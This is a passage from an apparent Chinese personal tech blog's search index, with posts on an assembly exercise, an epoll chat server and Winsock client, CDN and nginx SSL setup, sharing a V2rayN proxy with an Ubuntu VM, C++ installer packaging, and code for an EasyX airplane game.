在屏幕中间输出进制转换结果并提示选择累加或退出 ③ 输入Y选择累加，输入累加数据：00003456 ④ 输出相加后的转换结果并提示选择累加或退出 ⑤ 输入累加数据：65535，触发溢出，提示用户选择重新开始或退出 ⑥ 测试非法字符：A2134 ⑦ 测试非法数值：65536 ⑧ 测试非法长度：123456 ⑨ 测试五位数累加溢出：先输入数据65535（带前缀0也可以），再输入可以造成溢出的数据99000，检测到溢出 ⑩ 输入Y和y之外的任意字符退出程序 常用功能01号功能 功能：字符输入 出口：AL 02号功能 功能：字符输出 入口：DL 09号功能 功能：字符串输出 入口：DX 0A号功能 功能：字符串输入 出口：DX 注意：DX指向字符串地址，需要提前初始化(主要是初始化字符串的第一个字节，这个字节代表了该字符串可以容纳字符的个数，设置为FF表示无限制存储)，第一位是最大字符数，第二位是实际字符数，第三位开始是真正的字符串 反思 初始化栈段时要记得初始化栈顶指针SP 使用0A号功能接受字符串要注意提前设置最大容量 换行会导致寄存器被修改，例如刚刚使用01号功能接收字符就使用换行会导致AL被修改丢失数据 使用内存操作数养成习惯规定PTR，避免使用字类型寄存器接收字节内存数据导致数据出错 拓展练习 累加过程中提示用户当前可输入的最大值 累加发生溢出允许用户撤销此次输入并回退到上一个合法输出","tags":"输入输出 显存 汇编"},{"title":"epoll实现简易聊天小程序","url":"/post/587c1dda.html","text":"前言前几天博客托管平台被墙了，正好碰上阿里云学生计划送了7个月的云服务器，把博客部署完想着正好能用来学学网络编程 代码服务器端123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164#include &lt;iostream&gt;#include &lt;map&gt;#include &lt;sys/epoll.h&gt; // epoll_create#include &lt;sys/socket.h&gt; #include &lt;unistd.h&gt; #include &lt;netinet/in.h&gt; #include &lt;stdio.h&gt; // perror#include &lt;string&gt;// 最大连接数const int MAX_CONN = 1024;// 客户端信息struct Client&#123; int sockfd; std::string name;&#125;;int main()&#123; // 创建监听socket int sockfd = socket(AF_INET, SOCK_STREAM, 0); if (sockfd &lt; 0) &#123; perror(&quot;socket create error!\\n&quot;); return -1; &#125; // 绑定本地IP和端口 struct sockaddr_in addr; // &lt;netinet/in.h&gt; addr.sin_family = AF_INET; // IPv4 addr.sin_addr.s_addr = htonl(INADDR_ANY); // 绑定本地所有IP addr.sin_port = htons(9999); int ret = bind(sockfd, (struct sockaddr *)&amp;addr, sizeof(addr)); if (ret &lt; 0) &#123; perror(&quot;bind error!\\n&quot;); return -1; &#125; // 监听客户端连接 ret = listen(sockfd, 1024); if (ret &lt; 0) &#123; perror(&quot;listen error!\\n&quot;); return -1; &#125; // 创建epoll实例 int epld = epoll_create(1); // 参数需要大于0 if (epld &lt; 0) &#123; perror(&quot;epoll create error!\\n&quot;); return -1; &#125; // 将监听的socket加入epoll struct epoll_event ev; ev.events = EPOLLIN; // 读事件 ev.data.fd = sockfd; ret = epoll_ctl(epld, EPOLL_CTL_ADD, sockfd, &amp;ev); if (ret &lt; 0) &#123; perror(&quot;epoll_ctl error!\\n&quot;); return -1; &#125; // 保存客户端信息 std::map&lt;int, Client&gt; clients; // 循环监听客户端 while (1) &#123; struct epoll_event evs[MAX_CONN]; int n = epoll_wait(epld, evs, MAX_CONN, -1); // 阻塞，返回有操作的客户端的数量 if (n &lt; 0) &#123; perror(&quot;epoll_wait error!\\n&quot;); break; &#125; for (int i = 0; i &lt; n; ++i) &#123; int fd = evs[i].data.fd; // 监听的fd收到消息 if (fd == sockfd) &#123; struct sockaddr_in client_addr; socklen_t client_addr_len = sizeof(client_addr); int client_sockfd = accept(sockfd, (struct sockaddr *) &amp; client_addr, &amp;client_addr_len); if (client_sockfd &lt; 0) &#123; perror(&quot;accept error!\\n&quot;); continue; &#125; // 将客户端socket加入epoll struct epoll_event ev_client; ev_client.events = EPOLLIN; // 读事件, 检测客户端消息 ev_client.data.fd = client_sockfd; ret = epoll_ctl(epld, EPOLL_CTL_ADD, client_sockfd, &amp;ev_client); if (ret &lt; 0) &#123; perror(&quot;client_epoll_ctl error!\\n&quot;); break; &#125; std::cout &lt;&lt; client_addr.sin_addr.s_addr &lt;&lt; &quot;has entered~&quot; &lt;&lt; std::endl; // 保存该客户端的信息 Client client; client.sockfd = client_sockfd; client.name = &quot;&quot;; clients[client_sockfd] = client; &#125; else // 监听到客户端消息 &#123; char buffer[1024]; int n = read(fd, buffer, 1024); if (n &lt; 0) &#123; std::cout &lt;&lt; &quot;消息接收错误!&quot; &lt;&lt; std::endl; break; &#125; else if (0 == n) // 客户端断开连接 &#123; // 清除客户端信息 close(fd); epoll_ctl(epld, EPOLL_CTL_DEL, fd, 0); clients.erase(fd); &#125; else &#123; // char数组转化为string std::string msg(buffer, n); // 若客户端name为空，则消息是该客户端的用户名 if (clients[fd].name == &quot;&quot;) &#123; clients[fd].name = msg; &#125; // 否则是聊天消息 else &#123; std::string name = clients[fd].name; // 将消息发送给其他所有客户端 for (auto &amp;c : clients) &#123; if (c.first != fd) &#123; write(c.first, (&#x27;[&#x27; + name + &#x27;]&#x27; + &quot;: &quot; + msg).c_str(), msg.size() + name.size() + 4); &#125; &#125; &#125; &#125; &#125; &#125; &#125; // 关闭epoll实例 close(epld); close(sockfd);&#125; 客户端123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;iostream&gt;#include &lt;WinSock2.h&gt;#include &lt;WS2tcpip.h&gt;#pragma comment(lib,&quot;Ws2_32.lib&quot;) // link with Ws2_32.lib#define BUF_SIZE 1024char szMsg[BUF_SIZE];unsigned SendMsg(void *arg) // 固定写法，接收任何消息&#123; SOCKET sock = *((SOCKET *)arg); while (1) &#123; scanf(&quot;%s&quot;, szMsg); if (!strcmp(szMsg, &quot;QUIT\\n&quot;) || !strcmp(szMsg, &quot;quit\\n&quot;)) &#123; closesocket(sock); exit(0); &#125; send(sock, szMsg, strlen(szMsg), 0); &#125; return 0;&#125;unsigned RecvMsg(void* arg)&#123; SOCKET sock = *((SOCKET*)arg); char msg[BUF_SIZE]; while (1) &#123; int len = recv(sock, msg, sizeof(msg) - 1, 0); // 字符串结束有一个&#x27;\\0&#x27;所以减一 if (len == -1) // 服务器崩溃 &#123; return -1; &#125; msg[len] = &#x27;\\0&#x27;; printf(&quot;%s\\n&quot;, msg); &#125; return 0;&#125;int main()&#123; // 初始化socket环境 WORD wVersionRequested; WSADATA wsaData; int err; wVersionRequested = MAKEWORD(2, 2); err = WSAStartup(wVersionRequested, &amp;wsaData); if (err != 0) &#123; /* Tell the user that we could not find a usable */ /* WinSock DLL. */ return -1; &#125; if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) &#123; WSACleanup(); return -1; &#125; // 建立windows socket环境 // 创建socket SOCKET hSock; hSock = socket(AF_INET, SOCK_STREAM, 0); // 绑定端口 SOCKADDR_IN servAdr; memset(&amp;servAdr, 0, sizeof(SOCKADDR_IN)); servAdr.sin_family = AF_INET; servAdr.sin_port = htons(9999); inet_pton(AF_INET, &quot;47.115.204.216&quot;, &amp;servAdr.sin_addr); // 连接服务器 if (connect(hSock, (SOCKADDR*)&amp;servAdr, sizeof(servAdr)) == SOCKET_ERROR) &#123; printf(&quot;connect error: %d\\n&quot;, GetLastError()); return -1; &#125; else &#123; printf(&quot;欢迎来到聊天室，请输入您的用户名: &quot;); &#125; // 循环发消息 HANDLE hSendHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendMsg, (void *)&amp;hSock, 0, NULL); // 循环收消息 HANDLE hReceiveHand = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RecvMsg, (void*)&amp;hSock, 0, NULL); // 等待两个线程结束 WaitForSingleObject(hSendHandle, INFINITE); WaitForSingleObject(hReceiveHand, INFINITE); closesocket(hSock); WSACleanup();&#125; 测试服务器运行服务端程序，多台电脑运行客户端程序即可实现简易的收发消息 注：这里演示用的本机","tags":"网络编程"},{"title":"部署腾讯云CDN","url":"/post/3afe4483.html","text":"申请进入腾讯云CDN 新用户进入会提示开通，完成后就能自动获取腾讯云赠送的流量包(没有的话就去找别的学生活动领取) 部署添加域名左侧菜单-&gt;域名管理-&gt;添加域名 配置选项注意：如果回源协议选择HTTPS，配置的时候要上传SSL证书内容，否则仍然会使用HTTP访问，配置的时候忘了可以在域名管理页面删除域名重新申请 加速区域：国内 加速域名：dqywy.top 加速类型：自选，我选择CDN网页小文件 IPV6：不选 所属项目：默认项目 原站类型：自有源 回源协议：配置了SSL就选择HTTPS，否则就选HTTP 源站地址：服务器公网IP，支持多个 推荐配置我一项没改 效果","tags":"cdn"},{"title":"阿里云证书申请与部署","url":"/post/15a46dc9.html","text":"申请登录阿里云数字证书管理服务控制台 左侧菜单-&gt;SSL证书-&gt;免费证书-&gt;立即购买 产品：免费证书-&gt;数量20-&gt;其他服务：不需要 填写证书绑定域名-&gt;域名验证-&gt;联系人信息-&gt;密钥算法(默认RSA)-&gt;CSR生成方式(系统生成) 域名验证方式：如果域名在当前的阿里云账号下，那么可以选择自动DNS验证(没有这个选项就直接选手工验证) 联系人：如果之前没有填写过，新建联系人 证书下载 根据实际部署用的服务器选择，我选择Nginx 部署开启443端口非常重要且容易忽略的一步，部署过云服务器肯定都会这个 解压与上传 解压证书文件得到.pem和.key 云服务器上创建文件夹: mkdir /etc/nginx/cert 上传证书到文件夹(如果使用阿里云可以直接使用实例控制台的文件发送功能) 配置Nginx12nginx -t // 查看位置，一般为 /etc/nginx/nginx.confvim /etc/nginx/nginx.conf //修改配置文件 HTTP部分新增rewrite用于把http的域名请求转成https 123456789101112131415161718server &#123; listen 80; listen [::]:80; server_name dqywy.top; root /home/hexo; rewrite ^(.*)$ https://dqywy.top; # 新增 # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; error_page 404 /404.html; location = /404.html &#123; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; &#125; &#125; HTTPS部分 取消注释 填写server_name(域名)、root(网站前台)、ssl_certificate(.pem文件)、ssl_certificate_key(.key文件) 123456789101112131415161718192021222324server &#123; listen 443 ssl http2; listen [::]:443 ssl http2; server_name dqywy.top; root /home/hexo; ssl_certificate cert/dqywy.top.pem; ssl_certificate_key cert/dqywy.top.key; ssl_session_cache shared:SSL:1m; ssl_session_timeout 10m; ssl_ciphers HIGH:!aNULL:!MD5; ssl_prefer_server_ciphers on; # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; error_page 404 /404.html; location = /40x.html &#123; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; &#125; &#125; 配置完成后检查并重启12nginx -t // 检查nginx配置文件，返回successful即可nginx -s reload // 使配置生效 注意：记得改一下本地_config.yml中的网站URL地址 使用https://域名访问即可查看效果","tags":"ssl"},{"title":"V2rayN实现Ubuntu共享主机VPN","url":"/post/50a0a2de.html","text":"V2rayN设置 记录本地socks监听端口 开启允许来自局域网的连接选项 cmd输入ipconfig记录VMnet8IPv4地址 打开Ubuntu网络有线设置 打开网络代理 选择手动，Socks主机填入VMnet8的IPv4地址 端口填入V2rayN的本地socks监听端口 关闭网络代理窗口","tags":"共享vpn"},{"title":"C++项目打包发布","url":"/post/c4c57e4b.html","text":"安装MVSIP扩展进入VS-&gt;点击扩展-&gt;管理扩展 联机搜索Microsoft Visual Studio Installer Project，下载安装 PS：如果遇到下面情况 打开任务管理器-&gt;输入ID-&gt;结束任务 添加Setup Project右键解决方案-&gt;添加-&gt;新建项目-&gt;搜索setup project 项目打包新建一个文件夹，随意命名，用于存储项目文件(否则安装的位置文件到处都是) 将源代码文件都加载进来 PS：如果有其余资源文件，需要按照目录结构进行创建和加载 比如说，现在与源代码同文件夹下还有这些文件夹 那么就在新建的文件夹(我这里是界面设计)下新建这些文件夹并把内容加载进来 右键新建的文件夹-&gt;Add-&gt;项目输出-&gt;直接点击确定 生成主输出后新建快捷方式 剪切该快捷方式移动到User’s Desktop 为快捷方式选择图标 PS：这里只能从已经加载的文件中选择，并且必须为.ico文件 ** 重新生成Setup Project 打开打包文件夹 **Setup Project会根据项目属性选择Debug/Release进行存放，.vdproj文件不要删除，否则无法再次打包** 双击setup.exe即可安装(安装目录是项目文件存放位置，快捷方式固定存放在桌面)，再次双击即可选择删除安装 成功界面 双击快捷方式即可运行程序，不需要c++环境","tags":"项目"},{"title":"飞机大战-C++","url":"/post/36321cfe.html","text":"界面设计游戏界面和按钮设计 项目文件下载 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722#include &lt;easyx.h&gt;#include &lt;functional&gt;#include &lt;string&gt;#include &lt;vector&gt;#include &lt;iostream&gt;#include &lt;mmsystem.h&gt;#pragma comment(lib,&quot;winmm.lib&quot;)using namespace std;wchar_t name[20];int difficulty;static int music_num = 1; // 记录音乐控制键的点击次数// 控制音效void controlsound()&#123; ++music_num; if (music_num % 2 == 1) &#123; mciSendString(L&quot;play ./music/game_music.mp3 repeat&quot;, NULL, 0, NULL); &#125; else &#123; mciSendString(L&quot;pause ./music/game_music.mp3&quot;, NULL, 0, NULL); &#125;&#125;// 初始化数据void init()&#123;&#125;// 载入PNG图并去透明部分void drawAlpha(IMAGE *picture, int picture_x, int picture_y) //x为载入图片的X坐标，y为Y坐标&#123; // 变量初始化 DWORD *dst = GetImageBuffer(); // GetImageBuffer()函数，用于获取绘图设备的显存指针，EASYX自带 DWORD *draw = GetImageBuffer(); DWORD *src = GetImageBuffer(picture); //获取picture的显存指针 int picture_width = picture-&gt;getwidth(); //获取picture的宽度，EASYX自带 int picture_height = picture-&gt;getheight(); //获取picture的高度，EASYX自带 int graphWidth = getwidth(); //获取绘图区的宽度，EASYX自带 int graphHeight = getheight(); //获取绘图区的高度，EASYX自带 int dstX = 0; //在显存里像素的角标 // 实现透明贴图 公式： Cp=αp*FP+(1-αp)*BP ， 贝叶斯定理来进行点颜色的概率计算 for (int iy = 0; iy &lt; picture_height; iy++) &#123; for (int ix = 0; ix &lt; picture_width; ix++) &#123; int srcX = ix + iy * picture_width; //在显存里像素的角标 int sa = ((src[srcX] &amp; 0xff000000) &gt;&gt; 24); //0xAArrggbb;AA是透明度 int sr = ((src[srcX] &amp; 0xff0000) &gt;&gt; 16); //获取RGB里的R int sg = ((src[srcX] &amp; 0xff00) &gt;&gt; 8); //G int sb = src[srcX] &amp; 0xff; //B if (ix &gt;= 0 &amp;&amp; ix &lt;= graphWidth &amp;&amp; iy &gt;= 0 &amp;&amp; iy &lt;= graphHeight &amp;&amp; dstX &lt;= graphWidth * graphHeight) &#123; dstX = (ix + picture_x) + (iy + picture_y) * graphWidth; //在显存里像素的角标 int dr = ((dst[dstX] &amp; 0xff0000) &gt;&gt; 16); int dg = ((dst[dstX] &amp; 0xff00) &gt;&gt; 8); int db = dst[dstX] &amp; 0xff; draw[dstX] = ((sr * sa / 255 + dr * (255 - sa) / 255) &lt;&lt; 16) //公式： Cp=αp*FP+(1-αp)*BP ； αp=sa/255 , FP=sr , BP=dr | ((sg * sa / 255 + dg * (255 - sa) / 255) &lt;&lt; 8) //αp=sa/255 , FP=sg , BP=dg | (sb * sa / 255 + db * (255 - sa) / 255); //αp=sa/255 , FP=sb , BP=db &#125; &#125; &#125;&#125;// 定义Button类，表示一个按钮class Button&#123;private: int x; // 按钮左上角x坐标 int y; // 按钮左上角y坐标 int width; // 按钮宽度 int height; // 按钮高度 float scale; // 缩放比例，用于实现鼠标悬停效果 bool isMouseOver; // 表示鼠标是否在按钮上方 wstring text; // 按钮文本 function&lt;void()&gt; onClick; // 点击按钮触发的函数public: Button(int x, int y, int width, int height, const wstring &amp;text, const function&lt;void()&gt; &amp;onClick) : x(x), y(y), width(width), height(height), text(text), onClick(onClick), scale(1.0f), isMouseOver(false) &#123; &#125; // 检查鼠标是否在按钮上方 void checkMouseOver(int mouseX, int mouseY) &#123; isMouseOver = (mouseX &gt;= x &amp;&amp; mouseX &lt;= x + width &amp;&amp; mouseY &gt;= y &amp;&amp; mouseY &lt;= y + height); if (isMouseOver) &#123; scale = 0.9f; // 鼠标悬停时缩放按钮 &#125; else &#123; scale = 1.0f; // 恢复按钮原始大小 &#125; &#125; // 检查鼠标点击是否在按钮内，并执行函数 bool checkClick(int mouseX, int mouseY) &#123; if (mouseX &gt;= x &amp;&amp; mouseX &lt;= x + width &amp;&amp; mouseY &gt;= y &amp;&amp; mouseY &lt;= y + height) &#123; onClick(); // 执行按钮点击时的函数 isMouseOver = false; scale = 1.0f; return true; &#125; return false; &#125; // 绘制按钮 void draw() &#123; int scaledWidth = width * scale; // 缩放后的按钮宽度 int scaledHeight = height * scale; // 缩放后的按钮高度 int scaledX = x + (width - scaledWidth) / 2; // 缩放后的按钮x坐标 int scaledY = y + (height - scaledHeight) / 2; // 缩放后的按钮y坐标 if (isMouseOver) &#123; setlinecolor(RGB(0, 120, 215)); // 鼠标悬停时按钮边框颜色 setfillcolor(RGB(229, 241, 251)); // 鼠标悬停时按钮填充颜色 &#125; else &#123; setlinecolor(RGB(255, 144, 126)); // 按钮边框颜色 setfillcolor(RGB(225, 225, 225)); // 按钮填充颜色 &#125; setlinestyle(PS_DASH | PS_ENDCAP_FLAT, 3); // 设置线条宽度和样式 fillroundrect(scaledX, scaledY, scaledX + scaledWidth, scaledY + scaledHeight, 50, 50); // 绘制按钮 settextcolor(GREEN); // 设置文本颜色为绿色 setbkmode(TRANSPARENT); // 设置文本背景透明 settextstyle(25 * scale, 0, _T(&quot;华文彩云&quot;)); // 设置文本大小和字体 //居中显示按钮文本 int textX = scaledX + (scaledWidth - textwidth(text.c_str())) / 2; // 计算文本在按钮中央的x坐标 int textY = scaledY + (scaledHeight - textheight(_T(&quot;幼圆&quot;))) / 2; // 计算文本在按钮中央的y坐标 outtextxy(textX, textY, text.c_str()); // 在按钮上绘制文本 &#125;&#125;;// 定义Widget类，表示一个简单的图形用户界面class Widget&#123;private: wstring text_name = L&quot;飞机大战&quot;; // 标题文本 wstring set_name = L&quot;游戏设置&quot;; // 标题文本 wstring difficulty_name = L&quot;游戏难度&quot;; // 难度文本 wstring stop_name = L&quot;游戏暂停&quot;; // 暂停文本 wstring fail_name = L&quot;游戏失败&quot;; // 失败文本 wstring success_name = L&quot;闯关成功&quot;; // 失败文本 wstring rank_name = L&quot;排行榜&quot;; // 排行榜文本 wstring easy_name = L&quot;简单模式排行榜&quot;; // 简单排行榜文本 wstring medium_name = L&quot;中等模式排行榜&quot;; // 中等排行榜文本 wstring hard_name = L&quot;地狱模式排行榜&quot;; // 地狱排行榜文本 wstring author_name = L&quot;制作组信息&quot;; // 制作组文本 wstring rule_name = L&quot;游戏玩法&quot;; // 游戏玩法文本 RECT rect_name = &#123; 320, 50, 480, 150 &#125;; int text_x; // 文字的x坐标 int text_y; // 文字的y坐标 int width; // 宽度 int height; // 高度 int currentIndex; // 当前页面索引 vector&lt;IMAGE *&gt; pages; // 存储所有页面的图片指针 vector&lt;vector&lt;Button *&gt;&gt; buttons; // 存储每个页面上的按钮 // 添加一个页面 void addPage(IMAGE *page) &#123; pages.push_back(page); buttons.push_back(&#123;&#125;); &#125; // 在指定页面上添加一个按钮 void addButton(int index, Button *button) &#123; if (index &gt;= 0 &amp;&amp; index &lt; buttons.size()) &#123; buttons[index].push_back(button); &#125; &#125; // 设置当前显示的页面索引 void setCurrentIndex(int index) &#123; if (index &gt;= 0 &amp;&amp; index &lt; pages.size()) &#123; currentIndex = index; &#125; &#125; // 处理鼠标点击事件 void mouseClick(int mouseX, int mouseY) &#123; if (currentIndex &gt;= 0 &amp;&amp; currentIndex &lt; buttons.size()) &#123; for (Button *button : buttons[currentIndex]) &#123; if (button-&gt;checkClick(mouseX, mouseY)) &#123; break; &#125; &#125; &#125; &#125; // 处理鼠标移动事件 void mouseMove(int mouseX, int mouseY) &#123; if (currentIndex &gt;= 0 &amp;&amp; currentIndex &lt; buttons.size()) &#123; for (Button *button : buttons[currentIndex]) &#123; button-&gt;checkMouseOver(mouseX, mouseY); &#125; &#125; &#125; // 绘制当前页面的内容 void draw() &#123; if (currentIndex &gt;= 0 &amp;&amp; currentIndex &lt; pages.size()) &#123; putimage(0, 0, pages[currentIndex]); // 在窗口中绘制当前页面的图片 if (currentIndex &gt;= 0 &amp;&amp; currentIndex &lt; buttons.size()) &#123; for (Button *button : buttons[currentIndex]) &#123; button-&gt;draw(); // 绘制当前页面上的所有按钮 &#125; &#125; &#125; &#125;public: Widget(int width, int height) :width(width), height(height), currentIndex(-1) &#123; &#125; ~Widget() &#123;&#125; void drawpage(wstring loc, wstring name) &#123; IMAGE *page = new IMAGE(width, height);// 昵称界面的图片指针 loadimage(page, loc.c_str(), width, height, true); putimage(0, 0, page); setlinestyle(PS_DASH | PS_ENDCAP_FLAT, 3); // 设置线条宽度和样式 // 绘制标题 fillroundrect(rect_name.left, rect_name.top, rect_name.right, rect_name.bottom, 50, 50); // 绘制标题 settextcolor(GREEN); // 设置文本颜色为绿色 setbkmode(TRANSPARENT); // 设置文本背景透明 settextstyle(35, 0, _T(&quot;华文琥珀&quot;)); // 设置文本大小和字体 text_x = rect_name.left + (rect_name.right - rect_name.left - textwidth(name.c_str())) / 2; text_y = rect_name.top + (rect_name.bottom - rect_name.top - textheight(name.c_str())) / 2; outtextxy(text_x, text_y, name.c_str()); // 在按钮上绘制文本 getimage(page, 0, 0, width, height); // 将昵称页面的内容保存到图片中 addPage(page); // 添加昵称页面 &#125; void drawpage(wstring loc, wstring name, int) &#123; IMAGE *page = new IMAGE(width, height); loadimage(page, loc.c_str(), width, height, true); putimage(0, 0, page); // 绘制简单榜标题 RECT rect = &#123; 220, 50, 580, 150 &#125;; fillroundrect(rect.left, rect.top, rect.right, rect.bottom, 50, 50); // 绘制标题 settextcolor(GREEN); // 设置文本颜色为绿色 setbkmode(TRANSPARENT); // 设置文本背景透明 settextstyle(35, 0, _T(&quot;华文琥珀&quot;)); // 设置文本大小和字体 text_x = rect.left + (rect.right - rect.left - textwidth(name.c_str())) / 2; text_y = rect.top + (rect.bottom - rect.top - textheight(name.c_str())) / 2; outtextxy(text_x, text_y, name.c_str()); // 在按钮上绘制文本 fillroundrect(rect.left - 100, rect.top + 120, rect.right + 100, rect.bottom + 370, 50, 50); // 绘制标题 settextstyle(25, 0, _T(&quot;华文琥珀&quot;)); // 设置文本大小和字体 outtextxy(rect.left - 60, rect.top + 130, L&quot;排名&quot;); // 绘制排名 outtextxy(rect.left + 140, rect.top + 130, L&quot;昵称&quot;); // 绘制昵称 outtextxy(rect.left + 330, rect.top + 130, L&quot;积分&quot;); // 绘制积分 getimage(page, 0, 0, width, height); // 将页面的内容保存到图片中 addPage(page); // 添加暂停页面 &#125; // 初始化控件，创建图形环境，设置页面和按钮 void init() &#123; initgraph(width, height); BeginBatchDraw(); // 开始批量绘制, 批量绘制应该放在initgraph之后 // 0. 创建昵称界面 drawpage(L&quot;./resource/page/name.jpg&quot;, text_name); // 在昵称页面创建按钮input Button *name_input = new Button(320, 200, 160, 60, L&quot;输入游戏昵称&quot;, [&amp;]() &#123; InputBox(name, 20, L&quot;请输入游戏昵称&quot;); // 点击按钮输入游戏昵称 &#125;); addButton(0, name_input); // 将按钮input添加到昵称页面 // 在昵称页面创建按钮进入游戏 Button *name_enter = new Button(320, 310, 160, 60, L&quot;进入游戏&quot;, [&amp;]() &#123; setCurrentIndex(1); &#125;); addButton(0, name_enter); // 将按钮添加到昵称页面 // 在昵称页面创建按钮退出游戏 Button *name_exit = new Button(320, 420, 160, 60, L&quot;退出游戏&quot;, [&amp;]() &#123; closegraph(); exit(0); &#125;); addButton(0, name_exit); // 将按钮添加到昵称页面 // 1. 创建开始页面 drawpage(L&quot;./resource/page/start.jpg&quot;, text_name); // 在开始页面创建开始游戏按钮 Button *start_begin = new Button(320, 180, 150, 60, L&quot;开始游戏&quot;, [&amp;]() &#123; setCurrentIndex(2); // 进入游戏界面 &#125;); addButton(1, start_begin); // 将按钮添加到页面 // 在开始页面创建游戏难度按钮 Button *start_difficulty = new Button(320, 260, 150, 60, L&quot;游戏难度&quot;, [&amp;]() &#123; setCurrentIndex(3); // 进入游戏难度界面 &#125;); addButton(1, start_difficulty); // 将按钮添加到页面 // 在开始页面创建排行榜按钮 Button *start_rank = new Button(320, 340, 150, 60, L&quot;排行榜&quot;, [&amp;]() &#123; setCurrentIndex(4); // 进入排行榜界面 &#125;); addButton(1, start_rank); // 将按钮添加到页面 // 在开始页面创建游戏设置按钮 Button *start_set = new Button(320, 420, 150, 60, L&quot;游戏设置&quot;, [&amp;]() &#123; setCurrentIndex(5); // 进入开始界面的游戏设置界面 &#125;); addButton(1, start_set); // 将按钮添加到页面 // 在开始页面创建退出账号按钮 Button *start_exit = new Button(320, 500, 150, 60, L&quot;退出账号&quot;, [&amp;]() &#123; setCurrentIndex(0); // 返回昵称界面 &#125;); addButton(1, start_exit); // 将按钮添加到页面 // 2. 创建游戏页面 IMAGE *page_game = new IMAGE(width, height); loadimage(page_game, L&quot;./resource/page/game.jpg&quot;, width + 400, height, true); putimage(0, 0, page_game); // 演示 // 加载图片：以CPP文件为起始位置 loadimage(page_game, L&quot;./resource/icon/plane.png&quot;, 50, 50, true); // 战机 drawAlpha(page_game, 400, 580); // 载入PNG图并去透明部分 loadimage(page_game, L&quot;./resource/icon/plane_bullet.png&quot;, 30, 30, true); // 战机子弹 drawAlpha(page_game, 410, 540); // 载入PNG图并去透明部分 loadimage(page_game, L&quot;./resource/icon/enemy.png&quot;, 40, 40, true); // 敌机1 drawAlpha(page_game, 400, 50); // 载入PNG图并去透明部分 loadimage(page_game, L&quot;./resource/icon/enemy_bullet.png&quot;, 30, 30, true); // 敌机子弹1 drawAlpha(page_game, 405, 100); // 载入PNG图并去透明部分 loadimage(page_game, L&quot;./resource/icon/enemy.png&quot;, 40, 40, true); // 敌机2 drawAlpha(page_game, 350, 150); // 载入PNG图并去透明部分 loadimage(page_game, L&quot;./resource/icon/enemy_bullet.png&quot;, 30, 30, true); // 敌机子弹2 drawAlpha(page_game, 355, 200); // 载入PNG图并去透明部分 loadimage(page_game, L&quot;./resource/icon/enemy.png&quot;, 40, 40, true); // 敌机3 drawAlpha(page_game, 450, 70); // 载入PNG图并去透明部分 loadimage(page_game, L&quot;./resource/icon/enemy_bullet.png&quot;, 30, 30, true); // 敌机子弹3 drawAlpha(page_game, 455, 120); // 载入PNG图并去透明部分 loadimage(page_game, L&quot;./resource/icon/enemy.png&quot;, 40, 40, true); // 敌机4 drawAlpha(page_game, 200, 30); // 载入PNG图并去透明部分 loadimage(page_game, L&quot;./resource/icon/enemy_bullet.png&quot;, 30, 30, true); // 敌机子弹4 drawAlpha(page_game, 205, 80); // 载入PNG图并去透明部分 loadimage(page_game, L&quot;./resource/icon/item.png&quot;, 40, 40, true); // 道具 drawAlpha(page_game, 200, 320); // 载入PNG图并去透明部分 loadimage(page_game, L&quot;./resource/icon/item.png&quot;, 40, 40, true); // 道具 drawAlpha(page_game, 600, 220); // 载入PNG图并去透明部分 loadimage(page_game, L&quot;./resource/icon/score.png&quot;, 40, 60, true); // 计分板 drawAlpha(page_game, 15, 15); // 载入PNG图并去透明部分 loadimage(page_game, L&quot;./resource/icon/life.png&quot;, 40, 40, true); // 血量 drawAlpha(page_game, 10, 590); // 载入PNG图并去透明部分 fillroundrect(60, 25, 130, 65, 20, 50); // 分数显示 fillroundrect(50, 590, 120, 630, 20, 50); // 血量显示 getimage(page_game, 0, 0, width, height); // 将页面的内容保存到图片中 addPage(page_game); // 添加游戏页面 // 在游戏页面创建暂停按钮 Button *game_stop = new Button(730, 25, 60, 50, L&quot;暂停&quot;, [&amp;]() &#123; setCurrentIndex(6); // 进入暂停界面 &#125;); addButton(2, game_stop); // 将按钮添加到页面 // 3. 创建游戏难度页面 drawpage(L&quot;./resource/page/difficulty.jpg&quot;, difficulty_name); // 在游戏难度页面创建简单按钮 Button *difficulty_easy = new Button(320, 200, 160, 60, L&quot;简单&quot;, [&amp;]() &#123; difficulty = 1; // 难度设置为简单 &#125;); addButton(3, difficulty_easy); // 将按钮添加到页面 // 在游戏难度页面创建中等按钮 Button *difficulty_medium = new Button(320, 310, 160, 60, L&quot;中等&quot;, [&amp;]() &#123; difficulty = 2; // 